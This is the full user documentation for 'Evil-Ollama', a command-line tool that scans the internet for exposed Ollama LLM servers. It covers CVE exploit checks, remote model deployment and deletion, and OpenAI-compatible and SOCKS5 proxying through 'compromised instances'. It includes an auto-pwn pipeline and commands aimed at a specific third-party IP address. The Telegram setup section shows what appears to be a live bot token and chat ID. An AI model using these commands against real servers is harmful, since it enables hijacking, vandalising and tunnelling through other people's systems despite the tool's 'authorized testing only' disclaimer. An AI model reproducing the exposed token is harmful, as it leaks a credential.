
                     ███████╗██╗   ██╗██╗██╗         ██████╗ ██╗     ██╗      █████╗ ███╗   ███╗ █████╗
                     ██╔════╝██║   ██║██║██║        ██╔═══██╗██║     ██║     ██╔══██╗████╗ ████║██╔══██╗
                     █████╗  ██║   ██║██║██║        ██║   ██║██║     ██║     ███████║██╔████╔██║███████║
                     ██╔══╝  ╚██╗ ██╔╝██║██║        ██║   ██║██║     ██║     ██╔══██║██║╚██╔╝██║██╔══██║
                     ███████╗ ╚████╔╝ ██║███████╗    ╚██████╔╝███████╗███████╗██║  ██║██║ ╚═╝ ██║██║  ██║
                     ╚══════╝  ╚═══╝  ╚═╝╚══════╝     ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝

                                🦙 EVIL-OLLAMA v3.0 — Complete Documentation
                          Exposed Ollama Instance Hunter, Proxy & API Manipulation Tool
                              For authorized security research & bug bounty purposes only
====================================================================================================

# 📚 EVIL-OLLAMA Complete Documentation

## Table of Contents
1. [Overview](#overview)
2. [Installation](#installation)
3. [Quick Start](#quick-start)
4. [Scanning Modes](#scanning-modes)
5. [Vulnerability Scanning](#vulnerability-scanning)
6. [Model Operations](#model-operations)
7. [Ollama API Commands (1:1 API Mapping)](#ollama-api-commands)
8. [Proxy Features](#proxy-features)
9. [Chat Interface](#chat-interface)
10. [Fingerprinting](#fingerprinting)
11. [Auto-Pwn](#auto-pwn)
12. [Export & Reporting](#export--reporting)
13. [Telegram Notifications](#telegram-notifications)
14. [Configuration](#configuration)
15. [Monitoring Daemon](#monitoring-daemon)
16. [Architecture & Internals](#architecture--internals)
17. [Troubleshooting](#troubleshooting)

---

## Overview

Evil-Ollama is a comprehensive security testing tool for exposed Ollama LLM inference
instances. It combines:

- **Internet-wide scanning** — Find exposed Ollama instances across the globe
- **Vulnerability assessment** — 10+ CVE checks, SSRF, path traversal, auth bypass
- **Full Ollama API control** — Every `/api/*` endpoint exposed as a CLI command
- **Proxy server** — OpenAI-compatible proxy through compromised instances
- **Model manipulation** — Pull, push, create, copy, delete models remotely
- **Telegram integration** — Real-time alerts for new finds and model deployments
- **Export engine** — HTML/CSV/JSON reports with geolocation and vulnerability data

### What Makes Evil-Ollama Unique

| Feature | Evil-Ollama | Other Tools |
|---------|-------------|-------------|
| Full Ollama API access | ✅ push/create/copy/remove/ps/embed/generate | ❌ Read-only |
| Internet-wide scan | ✅ 50K+ IPs/min | ❌ Limited |
| Vulnerability scan | ✅ 10+ CVEs | ❌ None |
| Geofencing | ✅ Country/city/ISP | ❌ |
| Proxy via instance | ✅ OpenAI-compatible | ❌ |
| Multi-export | ✅ HTML/CSV/JSON | ❌ |
| Telegram bot | ✅ Real-time | ❌ |

---

## Installation

### Requirements
- Python 3.8+
- `aiohttp`, `requests`, `flask` (auto-installed via requirements.txt)

### Setup

```bash
git clone https://github.com/evogix/Evil-Ollama.git
cd Evil-Ollama
pip install -r requirements.txt
chmod +x launcher.sh
```

### Directory Structure

```
Evil-Ollama/
├── evilollama.py           # Main tool (~2800 lines)
├── launcher.sh             # Shell launcher (#!/bin/sh — Termux compatible)
├── requirements.txt        # Python dependencies
├── README.md               # Project README
├── DOCS.md                 # This documentation
├── .gitignore              # Config/instances/logs ignored
├── evilollama_config.json  # (gitignored) API keys, Telegram tokens
└── evilollama_instances.json  # (gitignored) Found instances database
```

### Termux (Android) Notes
- `#!/bin/sh` shebang in launcher.sh — compatible with Termux
- Use `pkg install python` if Python is not installed
- May need `pkg install libxml2 libxslt` for some dependencies

---

## Quick Start

### 1. First Scan

```bash
# Scan 10,000 random IPs for exposed Ollama
./launcher.sh scan --random 10000

# Same with geolocation and Telegram notification
./launcher.sh scan --random 50000 --geo --notify

# Full internet-wide scan (50K IPs + DNS + CT logs)
./launcher.sh scan --internet --geo --notify
```

### 2. Analyze Found Instance

```bash
# Deep fingerprint
./launcher.sh fingerprint -t 200.137.215.69:11434

# Vulnerability scan
./launcher.sh vuln -t 200.137.215.69:11434

# List all models
./launcher.sh models -t 200.137.215.69:11434
```

### 3. Deploy Model

```bash
# Pull a model onto the remote instance
./launcher.sh deploy -m gemma:2b -t 200.137.215.69:11434

# Or deploy to ALL found instances
./launcher.sh deploy -m llama3.2:1b --all
```

### 4. Chat & Proxy

```bash
# Interactive chat
./launcher.sh chat -t 200.137.215.69:11434

# Start OpenAI-compatible proxy (listens on localhost:8080)
./launcher.sh proxy -t 200.137.215.69:11434
```

---

## Scanning Modes

### `scan` — Instance Discovery

The `scan` command supports multiple discovery methods:

| Mode | Flag | Description | Speed |
|------|------|-------------|-------|
| Random IP | `--random N` | Scan N random public IPs | ~180 IPs/sec |
| CIDR Range | `--cidr 0.0.0.0/8` | Scan entire CIDR block | Depends on size |
| IP List | `--file ips.txt` | Scan IPs from file | ~180 IPs/sec |
| Shodan | `--shodan KEY` | Search Shodan for Ollama | Fast (API limit) |
| Censys | `--censys ID:SECRET` | Search Censys | Fast (API limit) |
| FOFA | `--fofa EMAIL:KEY` | Search FOFA | Fast (API limit) |
| DNS | `--dns domain.com` | DNS subdomain discovery | Fast |
| CT Logs | `--ct domain.com` | Certificate Transparency logs | Fast |
| **Internet** | **`--internet`** | **50K IPs + DNS + CT combined** | **~5-7 min** |

#### --random (Most Used)

```bash
./launcher.sh scan --random 50000 --geo --notify
```

Uses weighted random IP generation that biases toward IP ranges where
Ollama instances are statistically more likely to be found.

#### --internet (All-in-One)

```bash
./launcher.sh scan --internet --geo --notify
```

Runs 3 phases automatically:
1. **Phase 1**: Scan 50,000 random IPs
2. **Phase 2**: DNS discovery on 12 cloud providers (DigitalOcean, AWS, Azure,
   Google Cloud, Hetzner, OVH, Linode, Vultr, Alibaba, Oracle, IBM, Scaleway)
3. **Phase 3**: CT log search on top domains

#### --shodan / --censys / --fofa

```bash
# Configure API keys first
./launcher.sh config --shodan-key "YOUR_SHODAN_API_KEY"
./launcher.sh config --censys-id "ID" --censys-secret "SECRET"

# Then search
./launcher.sh scan --shodan YOUR_KEY
./launcher.sh scan --censys ID:SECRET
./launcher.sh scan --fofa EMAIL:KEY
```

#### --dns / --ct

```bash
# DNS-based subdomain enumeration
./launcher.sh scan --dns example.com --geo

# Certificate Transparency logs
./launcher.sh scan --ct example.com --geo
```

### Common Scan Options

| Flag | Description |
|------|-------------|
| `--port` | Port to scan (default: 11434) |
| `--concurrent` | Concurrent scan threads (default: 1000) |
| `--timeout` | Connection timeout in seconds (default: 4) |
| `--geo` | Geolocate found instances (city, country, ISP) |
| `--export` | Auto-export results (html, csv, json, all) |
| `--notify` | Send Telegram notification for each find |

### Geolocation Data

When `--geo` is enabled, each found instance includes:
- Country, City, ISP/Organization
- Latitude/Longitude coordinates
- Timezone

---

## Vulnerability Scanning

### `vuln` — Security Assessment

```bash
# Scan specific target
./launcher.sh vuln -t 200.137.215.69:11434

# Scan ALL found instances
./launcher.sh vuln --all

# Save results to file
./launcher.sh vuln -t 200.137.215.69:11434 -o scan_results.json
```

### Checks Performed (10+ Categories)

| # | Check | Endpoint | CVE |
|---|-------|----------|-----|
| 1 | Instance reachability | `/api/tags` | — |
| 2 | Server info disclosure | `HEAD /` | — |
| 3 | Model write access | `/api/push` test | — |
| 4 | Model deletion capability | `/api/delete` | — |
| 5 | API auth bypass | Various endpoints | CVE-2025-23104 |
| 6 | SSRF via model pulling | `/api/pull` | CVE-2024-39721 |
| 7 | Path traversal in model import | `/api/pull` | — |
| 8 | CORS misconfiguration | All endpoints | — |
| 9 | Version-based CVE mapping | `/api/version` | Multiple |
| 10 | CVE-2024-37032 (RCE) | History check | CVE-2024-37032 |
| 11 | Sensitive endpoint exposure | `/api/push`, `/api/delete` | — |
| 12 | Proxy functionality test | Generate endpoint | — |

### CVE Detection Matrix

| CVE | Severity | Description | Affected Versions |
|-----|----------|-------------|-------------------|
| CVE-2024-37032 | **CRITICAL** | RCE via malicious model | 0.1.0–0.3.0 |
| CVE-2024-39721 | HIGH | SSRF in model pulling | < 0.4.0 |
| CVE-2025-23104 | HIGH | API auth bypass | < 0.5.0 |
| Various | MEDIUM | Path traversal | Various |

### `exploit` — Targeted CVE Exploitation

```bash
# Test specific CVE against a target
./launcher.sh exploit --cve CVE-2024-37032 --target 200.137.215.69:11434
```

---

## Model Operations

### `models` — List, Pull & Analyze

```bash
# List all models on a remote instance
./launcher.sh models -t 200.137.215.69:11434

# Pull/download model info from remote (saves JSON + Modelfile)
./launcher.sh models --pull 200.137.215.69:11434 gemma:2b

# Deep model analysis
./launcher.sh models --analyze 200.137.215.69:11434 gemma:2b
```

#### models output fields:
- Model name, size, format, quantization
- Parameters, context length
- Embedding length
- Modelfile contents
- Full model metadata

---

## Ollama API Commands

Every Ollama API endpoint has a dedicated CLI command with 1:1 mapping.

### `deploy` — POST /api/pull (Pull Model)

Downloads/pulls a model from the Ollama registry **onto the remote instance**.

```bash
# Deploy to specific target
./launcher.sh deploy -m gemma:2b -t 200.137.215.69:11434

# Deploy to ALL saved instances
./launcher.sh deploy -m llama3.2:1b --all

# Use HuggingFace model
./launcher.sh deploy -m "hf.co/unsloth/Qwen2.5-0.5B-gguf:latest" -t TARGET

# With Telegram notification
./launcher.sh deploy -m gemma:2b -t TARGET --notify
```

**Note:** Model download can take several minutes depending on size.
Uses 600-second timeout.

### `push` — POST /api/push (Push Model to Registry)

Pushes a model **from the remote instance** to the Ollama registry.

```bash
./launcher.sh push -t 200.137.215.69:11434 -m mymodel:tag
```

### `create` — POST /api/create (Create Model)

Creates a new model on the remote instance from a Modelfile or base model.

```bash
# Create from Modelfile
./launcher.sh create -t TARGET -m mymodel:latest --modelfile ./Modelfile

# Create from base model
./launcher.sh create -t TARGET -m mycustom:latest --from gemma:2b
```

### `copy` — POST /api/copy (Copy Model)

Copies a model within the remote instance.

```bash
./launcher.sh copy -t TARGET -s gemma:2b -d gemma:2b-backup
```

### `remove` — DELETE /api/delete (Delete Model)

Deletes a model from the remote instance.

```bash
./launcher.sh remove -t TARGET -m model:tag
```

### `ps` — GET /api/ps (Running Models)

Lists currently loaded/running models on the remote instance.

```bash
./launcher.sh ps -t 200.137.215.69:11434
```

Sample output:
```
🧠 Running Models on 200.137.215.69:11434
============================================================
  gemma3:27b  (21.0GB)  expires: 2026-07-24T18:58:41Z
```

### `embed` — POST /api/embed (Generate Embeddings)

Generates vector embeddings using the remote instance.

```bash
./launcher.sh embed -t TARGET -m nomic-embed-text -p "Your text here"
```

Sample output:
```
✅ Embedding generated — dimensions: 768
First 8 values: [0.0089, 0.0608, -0.1618, ...]
Total dimensions: 768
```

### `generate` — POST /api/generate (Generate Completion)

Generates a text completion using the remote instance's model.

```bash
./launcher.sh generate -t TARGET -m gemma:2b -p "Tell me a joke"
```

Sample output:
```
⚡ Response from 200.137.215.69:11434/gemma:2b
============================================================
  What do you call a fake noodle? An impasta!
============================================================
  📌 Target Ollama version: 0.20.7
```

### API Command Reference Table

| CLI Command | API Endpoint | HTTP Method | Primary Use |
|-------------|-------------|-------------|-------------|
| `deploy` | `/api/pull` | POST | Download model onto instance |
| `push` | `/api/push` | POST | Upload model to registry |
| `create` | `/api/create` | POST | Create model from Modelfile |
| `copy` | `/api/copy` | POST | Duplicate model on instance |
| `remove` | `/api/delete` | DELETE | Delete model from instance |
| `ps` | `/api/ps` | GET | List running models |
| `embed` | `/api/embed` | POST | Generate embeddings |
| `generate` | `/api/generate` | POST | Generate text completion |
| `models` | `/api/tags` | GET | List all models |
| `models --analyze` | `/api/show` | POST | Model metadata |
| `chat` | `/api/chat` | POST | Interactive conversation |
| `fingerprint` | (multiple) | GET/POST | Deep instance analysis |

---

## Proxy Features

### `proxy` — OpenAI-Compatible Proxy

Starts a local proxy server that forwards requests to the remote Ollama
instance, making it compatible with OpenAI SDKs.

```bash
# Standard proxy (OpenAI-compatible on localhost:8080)
./launcher.sh proxy -t 200.137.215.69:11434

# Custom bind address and port
./launcher.sh proxy -t TARGET -p 9090 --host 0.0.0.0

# SOCKS5 proxy mode
./launcher.sh proxy --socks -t TARGET
```

### Proxy Endpoints

| Local Endpoint | Description |
|----------------|-------------|
| `GET /` | Instance info / health |
| `GET /v1/models` | List models (OpenAI format) |
| `POST /v1/chat/completions` | Chat completions (OpenAI format) |
| `POST /v1/completions` | Text completions (OpenAI format) |
| `POST /v1/embeddings` | Embeddings (OpenAI format) |
| `POST /v1/chat/completions` (stream) | Streaming completions |

### OpenAI SDK Usage with Proxy

```python
from openai import OpenAI

client = OpenAI(
    base_url="http://127.0.0.1:8080/v1",
    api_key="evil-ollama"  # Any value works
)

response = client.chat.completions.create(
    model="gemma:2b",
    messages=[{"role": "user", "content": "Hello!"}]
)
print(response.choices[0].message.content)
```

### SOCKS5 Proxy

```bash
./launcher.sh proxy --socks -t TARGET -p 1080
```

Creates a SOCKS5 tunnel that routes all TCP traffic through the
remote instance.

---

## Chat Interface

### `chat` — Interactive Chat

Engage in interactive conversation with any model on the remote instance.

```bash
# Interactive mode
./launcher.sh chat -t 200.137.215.69:11434

# Batch mode (send prompts from file)
./launcher.sh chat -t TARGET --batch prompts.txt
```

### Chat Features
- Conversation history preserved across turns
- Markdown-rendered responses
- Model switching during session
- Session export support
- Ctrl+C to exit cleanly

### Batch Mode

`prompts.txt` format (one prompt per line):
```
What is the capital of France?
Explain quantum computing in simple terms.
Write a haiku about security.
```

---

## Fingerprinting

### `fingerprint` — Deep Instance Analysis

Extracts comprehensive information about a remote Ollama instance.

```bash
# Fingerprint specific target
./launcher.sh fingerprint -t 200.137.215.69:11434

# Fingerprint ALL found instances
./launcher.sh fingerprint --all
```

### Fingerprint Output Includes

| Field | Description |
|-------|-------------|
| Status | Instance health |
| Version | Ollama version string |
| Model Count | Total number of models |
| Models | Names of all models (up to 8 shown) |
| Running Models | Currently loaded models |
| Running Count | Number of running models |
| Total Size | Combined size of all models |
| Response Time | API response latency |
| Model Details | Per-model: name, size, format, quantization |
| CVEs | Known vulnerabilities for this version |
| Geolocation | Country, city, ISP |

---

## Auto-Pwn

### `autopwn` — Fully Automated Pipeline

One-command pipeline: Scan → Geolocate → Vuln Scan → Export Report

```bash
# Default: scan 5000 random IPs
./launcher.sh autopwn

# Custom IP count and proxy port
./launcher.sh autopwn --random 10000 -p 8080

# Skip vulnerability scanning
./launcher.sh autopwn --no-vuln
```

### Pipeline Steps
1. **Scan**: Random IP scan (configurable count)
2. **Geolocate**: City/country/ISP for each found instance
3. **Vulnerability Scan**: Full CVE/security check on top 5 instances
4. **Report**: Generate HTML report automatically

---

## Export & Reporting

### `export` — Multi-Format Export

```bash
# HTML report (with map, tables, styling)
./launcher.sh export --format html

# CSV for spreadsheet analysis
./launcher.sh export --format csv

# JSON for programmatic use
./launcher.sh export --format json

# All formats at once
./launcher.sh export --format all
```

### `show` — Display Found Instances

```bash
# Basic display
./launcher.sh show

# With geolocation
./launcher.sh show --geo

# Export and show
./launcher.sh show --export html
```

### Export Formats

#### HTML Report
- Professional dark theme with hacker styling
- Sortable tables with instance data
- Geolocation mapped to cities
- Vulnerability counts per instance
- Color-coded severity indicators

#### CSV Export
- All instance fields as columns
- Easy to import into Excel/Google Sheets
- Includes geolocation data

#### JSON Export
- Full structured data
- Includes all metadata, models, CVEs
- Ready for further analysis

---

## Telegram Notifications

### Setup

```bash
./launcher.sh config --telegram-token "8907662225:AAG3AP6dajn-Bh17PB7hlKktNwfQP3fZNEU"
./launcher.sh config --telegram-chat "5448384682"
```

### What Triggers Notifications

| Event | Flag | Message Format |
|-------|------|----------------|
| Instance found | `--notify` on scan | 🦙 New Ollama Instance Found! IP, Geolocation, Models |
| Model deployed | `--notify` on deploy | 🦙 EVIL-OLLAMA DEPLOY — Model, Target, Status |

### Notification Format

```
🦙 New Ollama Instance Found!

📍 200.137.215.69:11434
🌍 Brazil / Goiânia
📦 Models: gemma3:27b, llama3.1:latest ...
🔢 Version: 0.20.7
📊 Models: 42
🏃 Running: 2
💀 CVEs: CVE-2024-37032, CVE-2024-39721
```

---

## Configuration

### `config` — Settings Management

```bash
# View current configuration
./launcher.sh config --show

# Set API keys
./launcher.sh config --telegram-token "YOUR_TOKEN"
./launcher.sh config --telegram-chat "YOUR_CHAT_ID"
./launcher.sh config --shodan-key "YOUR_KEY"

# Set key=value pair
./launcher.sh config --set key value
```

### Configuration File

Stored in `evilollama_config.json` (automatically .gitignored):

```json
{
  "telegram_token": "8907662225:...",
  "telegram_chat_id": "5448384682",
  "shodan_key": "",
  "notify_on_find": false,
  "auto_export": false,
  "export_format": "json",
  "monitor_interval": 3600,
  "block_internal": true
}
```

### Security Notes
- Config file is .gitignored — never commit secrets
- API keys stored in plaintext (standard for CLI tools)
- Use `--show` to verify current settings

---

## Monitoring Daemon

### `monitor` — Continuous Discovery

Runs scan cycles at regular intervals for persistent monitoring.

```bash
# Scan every hour (3600 seconds)
./launcher.sh monitor --interval 3600

# Custom IPs per scan
./launcher.sh monitor --random 10000 --interval 1800

# With notifications
./launcher.sh monitor --notify --export html
```

### Features
- Runs indefinitely until Ctrl+C
- Automatic geolocation on new finds
- Optional auto-export per cycle
- Telegram notifications for new instances
- Cycle counter and timing stats

---

## Architecture & Internals

### Code Structure (~2800 lines)

```
evilollama.py
├── Configuration & Constants (lines 80-110)
├── Utility Functions (lines 186-290)
│   ├── log(), load_json(), save_json()
│   ├── is_public_ip(), bytes_to_human()
│   ├── generate_random_ips()  [weighted IP generation]
│   └── IPSource strategies
├── Async Scanner (lines 295-450)
│   ├── scan_ips() — async TCP connect
│   ├── check_ollama() — HTTP probe
│   └── fingerprint_instance() — deep scan
├── Discovery Modules (lines 455-700)
│   ├── discover_by_dns()
│   ├── discover_by_ct()
│   ├── search_shodan()
│   ├── search_censys()
│   └── search_fofa()
├── Geolocation Engine (lines 705-830)
│   └── batch_geolocate() — ip-api.com
├── Vulnerability Scanner (lines 835-1100)
│   ├── scan_vulnerabilities()
│   └── 10+ CVE checks
├── Model Operations (lines 1105-1218)
│   ├── list_models()
│   ├── pull_model()
│   └── deploy_model_to_instance()
├── Ollama API Wrappers (lines 1240-1385)
│   ├── _api_req() — generic helper
│   ├── api_push/create/copy/delete/ps/embed/generate
│   └── cmd_*() — individual command handlers
├── Telegram Notifier (lines 1490-1535)
├── Proxy Server (lines 1537-1700)
│   ├── start_proxy() — OpenAI-compatible Flask proxy
│   └── start_socks_proxy()
├── Chat Interface (lines 1705-1850)
│   ├── interactive_chat()
│   └── batch_chat()
├── Export Engine (lines 1855-2100)
│   ├── export_html()
│   ├── export_csv()
│   └── export_json()
├── Monitoring Daemon (lines 2105-2150)
├── Auto-Pwn Pipeline (lines 2155-2220)
├── Display Functions (lines 2225-2250)
└── CLI Main (lines 2253-end)
    ├── Argument Parser (15+ subparsers)
    └── Command Dispatch (30+ routes)
```

### Key Design Decisions

**Async Scanning**: Uses `aiohttp` for non-blocking TCP connections,
achieving ~180 scans/second with 1000 concurrent workers.

**Weighted IP Generation**: Public IP ranges are weighted by statistical
probability of hosting Ollama instances, improving hit rates.

**No Web Dashboard**: Fully CLI-based. No Flask/Gunicorn for monitoring,
keeping the tool lightweight and stealthy.

**Streaming vs Non-Streaming**: API calls default to non-streaming for
simplicity. Model pulls and generates use appropriate timeouts (600s
for pulls, 120s for generates).

**Error Resilience**: All network calls are wrapped in try/except.
Failures on one instance don't block the entire operation.

---

## Troubleshooting

### Common Issues

| Problem | Cause | Solution |
|---------|-------|----------|
| No instances found | IP range low density | Use `--random 50000` or `--internet` |
| Connection timeout | Target not reachable | Check if instance is online |
| Read timeout on deploy | Model too large | Use smaller model (e.g., gemma:2b) |
| "Not available" error | Model not in registry | Verify model name spelling |
| Telegram not sending | Missing token/chat | Run `config --show` to verify |
| Async error on Termux | Python version | Use Python 3.8+ |
| Flask not found | Missing dependency | `pip install flask` |

### Best Practices

1. **Start small**: Use `--random 10000` before committing to large scans
2. **Check disclosed reports**: Search H1/BC for known issues on target
3. **Rate limiting**: Default 1000 concurrent is safe; reduce if blocked
4. **5-minute rule**: Skip hosts unresponsive after 5 minutes
5. **Save everything**: Use `--export html` to preserve findings
6. **Time-box chains**: 20 min per exploit chain attempt
7. **Verify findings**: Always reproduce before reporting

### Performance Tips

- **Network speed**: Good internet = faster scans. Use VPS for best results
- **Concurrent setting**: Adjust `--concurrent` based on your connection
- **Timeout tuning**: Lower `--timeout` for faster scans, higher for reliability
- **Batch size**: 50,000 IPs is the sweet spot for `--internet` mode

---

## Quick Reference Card

```
━━━ SCANNING ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 scan --random 50000          Scan 50K random IPs
 scan --internet              Full internet scan (50K+DNS+CT)
 scan --geo --notify          Scan + geolocate + Telegram
 scan --shodan KEY            Shodan search
 scan --dns example.com       DNS discovery
 scan --ct example.com        CT log discovery

━━━ EXPLOITATION ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 vuln -t TARGET               Vulnerability scan
 exploit --cve CVE-2024-37032 -t TARGET   Check specific CVE
 autopwn                      Full auto pipeline

━━━ API CONTROL (1:1 WITH /api/*) ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 deploy -m MODEL -t TARGET    /api/pull — Pull model
 push -m MODEL -t TARGET      /api/push — Push to registry
 create -m MODEL -t TARGET    /api/create — Create model
 copy -s SRC -d DEST -t TG    /api/copy — Copy model
 remove -m MODEL -t TARGET    /api/delete — Delete model
 ps -t TARGET                 /api/ps — Running models
 embed -m MODEL -p TEXT -t T  /api/embed — Embeddings
 generate -m MODEL -p TXT -t  /api/generate — Completion

━━━ INTERACTION ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 chat -t TARGET               Interactive chat
 proxy -t TARGET              OpenAI-compatible proxy
 fingerprint -t TARGET        Deep instance analysis
 models -t TARGET             List all models

━━━ DATA ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 show                         Display saved instances
 export --format html/csv/json Export results

━━━ CONFIG ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 config --show                View config
 config --telegram-token TK   Set Telegram bot token
 config --telegram-chat ID    Set Telegram chat ID
```

---

> **Evil-Ollama v3.0** — For authorized security testing only.
> Built by [evogix](https://github.com/evogix/Evil-Ollama)
